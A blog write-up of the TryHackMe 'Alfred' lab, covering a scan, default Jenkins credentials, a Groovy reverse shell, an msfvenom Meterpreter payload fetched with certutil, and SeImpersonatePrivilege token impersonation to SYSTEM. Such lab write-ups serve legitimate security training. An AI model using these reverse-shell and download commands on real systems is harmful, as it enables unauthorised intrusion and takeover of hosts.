---
title: "Alfred"
datePublished: Sun Aug 06 2023 06:10:18 GMT+0000 (Coordinated Universal Time)
cuid: clkz1o7n0000c0aky82kx74kw
slug: alfred
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1691589674162/afecd4e2-73df-4f79-ad6e-5a10e74bd4a4.png
tags: ctf, penetration-testing, 2articles1week, tryhackme, ctf-writeup

---

This walkthrough will go over the [Alfred](https://tryhackme.com/room/alfred) room found on [TryHackMe](https://tryhackme.com). The objective behind this room is to exploit a misconfigured Jenkins server, obtain a reverse shell, and escalate privileges by leveraging a `SeImpersonatePrivilege` capability on a low-level user to obtain `NT AUTHORITY\SYSTEM` level privileges.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691301818828/a91e91f2-b0ac-457a-9228-8f0a8cb964d0.png align="center")

### Step 1: Nmap

```bash
nmap -sC -sV -O -p- -Pn alfred.thm --min-rate=1000
```

```plaintext
┌──(root㉿kali)-[~]
└─# nmap -sC -sV -O -p- -Pn alfred.thm --min-rate=1000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-22 17:33 MDT
Nmap scan report for alfred.thm (10.10.70.88)
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|7|8.1 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1:r1
Aggressive OS guesses: Microsoft Windows Server 2008 R2 or Windows 8 (87%), Microsoft Windows Server 2008 R2 SP1 (87%), Microsoft Windows Server 2008 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 7 SP1 (85%), Microsoft Windows 8.1 R1 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.82 seconds
```

From this scan, we identified three open ports: 80, 3389, and 8080.

Port 80:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691301860116/5d6ce597-3d72-4198-9f5e-77c5e2d5c3e4.png align="center")

Port 8080:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691301877545/ab705601-fa4e-412d-a000-b6373ce2c088.png align="center")

### Step 2: Logging In

Trying some default login credentials, we discover that `admin:admin` works.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691301895746/23b418b2-8179-4d4f-8d80-a5c67410a555.png align="center")

### Step 3: Initial Foothold

Peeking around the system, we find an area where we can use `groovy` scripts. This will be our way into the box.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691301912905/2623a425-11de-4301-a1f0-e7e5b203dddd.png align="center")

We're using a groovy shell which can be found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy).

```php
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Running this script inside the built-in `Script Console` calls our attack box and drops us into a shell.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691301962193/86c8e757-befb-433a-aa36-d828d60ca937.png align="center")

From here we find our `user.txt` flag located in `C:\Users\bruce\Desktop\` .

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691301971137/3296a91b-9046-4d90-b0f7-9433675ce6af.jpeg align="center")

### Step 4: Upgrade to Meterpreter Shell

First, we want to generate our payload using `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.28.215 LPORT=1335 --format exe -o payload.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302000265/483a5146-9d7a-4d33-9db7-05cb9c09007f.webp align="center")

From the victim, we're going to use `certutil` to download it.

```bash
certutil.exe -urlcache -f http://10.13.28.215:8000/payload.exe payload.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302014664/102fb327-07be-4624-bbc0-74e1356897d5.webp align="center")

Now we fire up `msfconsole` and set up our handler to catch the shell.

1. `use exploit/multi/handler`
    
2. `set payload windows/meterpreter/reverse_tcp`
    
3. `set LHOST <ATTACKER_IP>`
    
4. `set LPORT 1335`
    
5. `exploit`
    

Once the `payload.exe` is run on the victim machine, our handler will catch the shell and drop us in.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302062807/2da5c976-0a1c-4fba-8435-640bc686b8b7.webp align="center")

### Step 5: Privesc

Let's see what privileges we have currently by typing `whoami /priv`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302097741/26946bf1-f36b-4081-8b45-95fd0b1716ec.webp align="center")

Nice. We have `SeImpersonatePrivilege`, let's exploit this vulnerability. We can achieve this by using the `incognito module` built into metasploit.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302105355/5dcbd0e2-abf7-4162-830b-97854bada4d0.webp align="center")

Next, we want to impersonate the Administrator's token. We can do this by typing the following command: `impersonate_token "BUILTIN\Administrators"`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302112792/09d85050-8f39-417b-a03b-ac2e11017caf.png align="center")

Now let's migrate to a process with correct permissions. The safest bet is to always migrate to the `services.exe` service.

1. View processes: `ps`
    
2. Find the PID of `services.exe`
    
3. `migrate <PID>`
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302134644/1c59dc1b-ca2f-4246-a8ef-847b6fc8eb70.webp align="center")

Now that we're successfully `NT AUTHORITY\SYSTEM`, let's find our root flag and complete this room.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691302142088/b9e2bb98-1942-4e38-8663-e0c86e10076a.jpeg align="center")

This room was a great introduction to AD pentesting. After going through this, I realized I have a long way ahead of me until I feel comfortable enough to sit down for the PNPT certification by TCM Security. I hope you enjoyed this walkthrough of the [Alfred](https://tryhackme.com/room/alfred) room found on [TryHackMe](https://tryhackme.com), and as always, Happy Hacking.